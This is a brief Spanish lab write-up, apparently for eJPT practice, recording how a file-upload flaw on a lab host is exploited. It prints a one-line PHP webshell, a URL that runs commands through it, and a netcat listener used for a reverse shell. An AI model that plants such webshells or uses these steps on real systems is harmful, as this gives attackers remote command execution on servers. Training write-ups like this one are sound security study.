@@ -1,0 +1,28 @@
+# Lab 03 — Explotación Básica (EJPT Exploitation Basic)
+
+## Objetivo
+Explotar una vulnerabilidad básica para obtener acceso.
+
+## Vulnerabilidad detectada
+- File upload vulnerable (subida de ficheros sin validación)
+
+## Herramientas usadas
+- msfconsole
+- python -m http.server
+- curl
+
+## Pasos realizados
+1. Crear webshell PHP:
+   ```php
+   <?php system($_GET['cmd']); ?>
+2.Subir el archivo a /uploads
+3.Ejecutar: http://10.10.10.10/uploads/shell.php?cmd=whoami
+4.Obtener reverse shell: nc -lvnp 4444
+
+Resultado
+
+Shell obtenido como usuario www-data.
+
+Conclusión
+
+La aplicación permitía subir ficheros sin validación, lo que permitió ejecución remota.
